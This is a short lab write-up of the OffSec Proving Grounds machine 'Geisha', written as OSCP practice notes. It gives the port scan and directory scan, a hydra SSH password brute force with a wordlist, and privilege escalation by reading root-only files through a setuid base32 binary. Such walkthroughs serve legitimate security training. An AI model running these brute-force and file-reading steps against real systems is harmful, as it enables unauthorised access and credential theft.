---
title: OffSec PG - Geisha
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.56.82`

### Network Scan

Nmap scan &rarr; `nmap -sC -A -Pn -p- -o nmap.txt 192.168.56.82`

OS Detection &rarr;  `OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 21       | FTP         | vsftpd 3.0.3                                   |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |
| 7080     | HTTPS       | ssl/empowerid LiteSpeed                        |
| 7125     | HTTP        | nginx 1.17.10                                  |
| 8088     | HTTP        | LiteSpeed httpd                                |
| 9198     | HTTP        | SimpleHTTPServer 0.6 (Python 2.7.16)           |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.56.82:<ports> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

Port 8088 &rarr;

- cgi-bin/ (404)
- docs/
- blocked/ (403)

Port 7125 &rarr;

- shadow (403)
- passwd

The passwd file lists user `geisha`.

---

## Exploitation

With the username as `geisha`, a brute force was launched on the ssh server using hydra as follows &rarr; `hydra -l geisha -P /home/tanq/installations/SecLists/rockyou.txt ssh://192.168.56.82`.

This gives the password as `letmein`. After a successful login, the user flag can be obtained.

---

## Privilege Escalation

Using the user shell, enumerated for setuid binaries as follows &rarr; `find / -perm -u=s 2>/dev/null`.

This resulted in an interesting find for the binary `/usr/bin/base32`. This could be used to read files with a privileged access, thereby allowing reads of files owned by root. Therefore, it was used to read the root flag as follows &rarr;

```
file=/root/proof.txt
/usr/bin/base32 "$file" | /usr/bin/base32 --decode
```

This can also be used to obtain root shell by using it to leak the ssh key of root and then using it to log in to the machine via ssh.

This gave the root flag.

---
